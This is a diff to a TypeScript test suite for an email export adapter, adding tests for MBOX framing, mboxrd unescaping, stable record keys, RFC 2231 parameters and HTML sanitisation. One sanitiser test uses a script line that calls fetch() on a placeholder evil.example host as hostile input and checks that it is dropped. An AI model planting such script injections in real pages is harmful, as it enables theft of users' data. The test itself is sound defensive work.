@@ -143,7 +143,7 @@ describe("email export adapter", () => {
     expect(markdown).not.toContain("![track](");
   });
 
-  test("streams MBOX siblings while disclosing duplicate and missing identities", async () => {
+  test("streams MBOX siblings while preserving repeated and missing identities", async () => {
     const input = await fixtureInput("mixed.mbox", ".mbox", 5);
     const first = await runRecordAdapter(emailRecordAdapter, input);
     const second = await runRecordAdapter(
@@ -154,11 +154,9 @@ describe("email export adapter", () => {
     expect(first.authoritative).toBe(false);
     expect(first.snapshotState).toBe("partial");
     expect(first.records).toHaveLength(3);
-    expect(first.records.map((record) => record.sourceLocator)).toEqual([
-      "message:2",
-      "message:1",
-      "message:3",
-    ]);
+    expect(
+      new Set(first.records.map((record) => record.sourceLocator))
+    ).toEqual(new Set(["message:1", "message:2", "message:3"]));
     expect(new Set(first.records.map((record) => record.recordKey)).size).toBe(
       3
     );
@@ -169,8 +167,10 @@ describe("email export adapter", () => {
       first.failures.some((failure) => failure.code === "MALFORMED_RECORD")
     ).toBe(true);
     expect(
-      first.records.some((record) => record.markdown.includes("Occurrence: 2"))
-    ).toBe(true);
+      first.records.filter((record) =>
+        record.markdown.includes("Message-ID: duplicate@example.com")
+      )
+    ).toHaveLength(2);
     expect(
       first.records.some((record) =>
         record.markdown.includes("content-derived identity")
@@ -183,6 +183,232 @@ describe("email export adapter", () => {
     ).toBe(true);
     expect(second.records).toEqual(first.records);
     expect(second.failures).toEqual(first.failures);
+  });
+
+  test("does not split body prose on a From prefix and unescapes mboxrd body lines", async () => {
+    const mailbox = [
+      "From sender@example.com Tue Jul 21 14:30:00 2026",
+      "From: Sender <sender@example.com>",
+      "Message-ID: <body-from@example.com>",
+      "Subject: Body From",
+      "Content-Type: text/plain; charset=utf-8",
+      "",
+      "From the working group",
+      ">From escaped@example.com Tue Jul 21 14:31:00 2026",
+      "still the same message",
+      "From next@example.com Tue Jul 21 14:32:00 2026",
+      "From: Next <next@example.com>",
+      "Message-ID: <next@example.com>",
+      "Subject: Next",
+      "Content-Type: text/plain; charset=utf-8",
+      "",
+      "next message",
+    ].join("\n");
+    const result = await runRecordAdapter(
+      emailRecordAdapter,
+      bytesInput(encode(mailbox), ".mbox", {}, 1)
+    );
+
+    expect(result.authoritative).toBe(true);
+    expect(result.records).toHaveLength(2);
+    const first = result.records.find((record) => record.title === "Body From");
+    expect(first?.markdown).toContain("From the working group");
+    expect(first?.markdown).toContain(
+      "From escaped@example.com Tue Jul 21 14:31:00 2026"
+    );
+    expect(first?.markdown).not.toContain(">From escaped@example.com");
+    expect(first?.markdown).toContain("still the same message");
+  });
+
+  test("uses Content-Length framing instead of envelope-shaped body lines", async () => {
+    const body = [
+      "first line",
+      "From trap@example.com Tue Jul 21 14:31:00 2026",
+      "still first",
+      "",
+    ].join("\n");
+    const mailbox = [
+      "From sender@example.com Tue Jul 21 14:30:00 2026",
+      "From: Sender <sender@example.com>",
+      "Message-ID: <content-length@example.com>",
+      "Subject: Content length",
+      "Content-Type: text/plain; charset=utf-8",
+      `Content-Length: ${encode(body).byteLength}`,
+      "",
+      body +
+        [
+          "From next@example.com Tue Jul 21 14:32:00 2026",
+          "From: Next <next@example.com>",
+          "Message-ID: <content-length-next@example.com>",
+          "Subject: Next",
+          "Content-Type: text/plain; charset=utf-8",
+          "",
+          "next message",
+        ].join("\n"),
+    ].join("\n");
+    const result = await runRecordAdapter(
+      emailRecordAdapter,
+      bytesInput(encode(mailbox), ".mbox", {}, 3)
+    );
+
+    expect(result.authoritative).toBe(true);
+    expect(result.records).toHaveLength(2);
+    const first = result.records.find(
+      (record) => record.title === "Content length"
+    );
+    expect(first?.markdown).toContain(
+      "From trap@example.com Tue Jul 21 14:31:00 2026"
+    );
+    expect(first?.markdown).toContain("still first");
+  });
+
+  test("fails closed on Content-Length that ends inside a physical line", async () => {
+    const mailbox = [
+      "From bad@example.com Tue Jul 21 14:30:00 2026",
+      "From: Bad <bad@example.com>",
+      "Message-ID: <bad-length@example.com>",
+      "Subject: Bad length",
+      "Content-Length: 2",
+      "",
+      "long body",
+      "From next@example.com Tue Jul 21 14:31:00 2026",
+      "From: Next <next@example.com>",
+      "Message-ID: <after-bad-length@example.com>",
+      "Subject: After bad length",
+      "",
+      "safe sibling",
+    ].join("\n");
+    const result = await runRecordAdapter(
+      emailRecordAdapter,
+      bytesInput(encode(mailbox), ".mbox", {}, 2)
+    );
+
+    expect(result.authoritative).toBe(false);
+    expect(result.records.map((record) => record.title)).toEqual([
+      "After bad length",
+    ]);
+    expect(result.failures[0]?.code).toBe("MALFORMED_RECORD");
+  });
+
+  test("keeps repeated Message-ID record keys stable across reorder, removal, and body edits", async () => {
+    const message = (subject: string, minute: string, body: string): string =>
+      [
+        `From sender@example.com Tue Jul 21 14:${minute}:00 2026`,
+        "From: Sender <sender@example.com>",
+        `Date: Tue, 21 Jul 2026 14:${minute}:00 +0200`,
+        "Message-ID: <repeated@example.com>",
+        `Subject: ${subject}`,
+        "Content-Type: text/plain; charset=utf-8",
+        "",
+        body,
+      ].join("\n");
+    const first = await runRecordAdapter(
+      emailRecordAdapter,
+      bytesInput(
+        encode(
+          `${message("Alpha", "30", "alpha")}\n${message("Beta", "31", "beta")}`
+        ),
+        ".mbox"
+      )
+    );
+    const reordered = await runRecordAdapter(
+      emailRecordAdapter,
+      bytesInput(
+        encode(
+          `${message("Beta", "31", "beta")}\n${message("Alpha", "30", "alpha")}`
+        ),
+        ".mbox"
+      )
+    );
+    const edited = await runRecordAdapter(
+      emailRecordAdapter,
+      bytesInput(encode(message("Alpha", "30", "alpha edited")), ".mbox")
+    );
+    const keys = (records: typeof first.records): Map<string, string> =>
+      new Map(records.map((record) => [record.title ?? "", record.recordKey]));
+
+    expect(keys(reordered.records)).toEqual(keys(first.records));
+    expect(keys(edited.records).get("Alpha")).toBe(
+      keys(first.records).get("Alpha")
+    );
+  });
+
+  test("supports RFC 2231 continuation parameters and multipart boundary padding", async () => {
+    const eml = [
+      "From: Sender <sender@example.com>",
+      "Message-ID: <continued-params@example.com>",
+      "Subject: Continued parameters",
+      "Content-Type: multipart/mixed;",
+      " boundary*0*=utf-8''gno%2D;",
+      " boundary*1*=boundary",
+      "",
+      "--gno-boundary \t",
+      "Content-Type: text/plain; charset=utf-8",
+      "",
+      "bounded text",
+      "--gno-boundary",
+      "Content-Type: application/octet-stream",
+      "Content-Disposition: attachment;",
+      " filename*0*=utf-8''report%20;",
+      " filename*1*=final.txt",
+      "Content-Transfer-Encoding: base64",
+      "",
+      "aGVsbG8=",
+      "--gno-boundary-- \t",
+    ].join("\r\n");
+    const result = await runRecordAdapter(
+      emailRecordAdapter,
+      bytesInput(encode(eml), ".eml", {}, 2)
+    );
+
+    expect(result.authoritative).toBe(true);
+    expect(result.records[0]?.markdown).toContain("bounded text");
+    expect(result.records[0]?.metadata?.attachments?.[0]?.name).toBe(
+      "report final.txt"
+    );
+  });
+
+  test("drops an unclosed dangerous HTML block through end of input", async () => {
+    const eml = [
+      "From: Sender <sender@example.com>",
+      "Message-ID: <unclosed-script@example.com>",
+      "Subject: Unclosed script",
+      "Content-Type: text/html; charset=utf-8",
+      "",
+      "<p>Visible evidence.</p>",
+      "<script>fetch('https://evil.example/secret')",
+      "hidden payload",
+    ].join("\r\n");
+    const result = await runRecordAdapter(
+      emailRecordAdapter,
+      bytesInput(encode(eml), ".eml")
+    );
+    const markdown = result.records[0]?.markdown ?? "";
+
+    expect(result.authoritative).toBe(true);
+    expect(markdown).toContain("Visible evidence.");
+    expect(markdown).not.toContain("evil.example");
+    expect(markdown).not.toContain("hidden payload");
+  });
+
+  test("handles a near-limit physical line delivered as one-byte chunks", async () => {
+    const longBody = "x".repeat(20_000);
+    const mailbox = [
+      "From sender@example.com Tue Jul 21 14:30:00 2026",
+      "From: Sender <sender@example.com>",
+      "Message-ID: <tiny-chunks@example.com>",
+      "Subject: Tiny chunks",
+      "Content-Type: text/plain; charset=utf-8",
+      "",
+      longBody,
+    ].join("\n");
+    const result = await runRecordAdapter(
+      emailRecordAdapter,
+      bytesInput(encode(mailbox), ".mbox", { maxRecordChars: 25_000 }, 1)
+    );
+
+    expect(result.authoritative).toBe(true);
+    expect(result.records[0]?.markdown).toContain(longBody);
   });
 
   test("isolates an oversized MBOX message and continues with the next sibling", async () => {
@@ -250,7 +476,7 @@ describe("email export adapter", () => {
     expect(result.records).toEqual([]);
     expect(result.authoritative).toBe(false);
     expect(
-      result.failures.some((failure) => failure.code === "MALFORMED_RECORD")
+      result.failures.some((failure) => failure.code === "RECORD_TOO_LARGE")
     ).toBe(true);
     expect(JSON.stringify(result)).not.toContain("AAAA");
   });
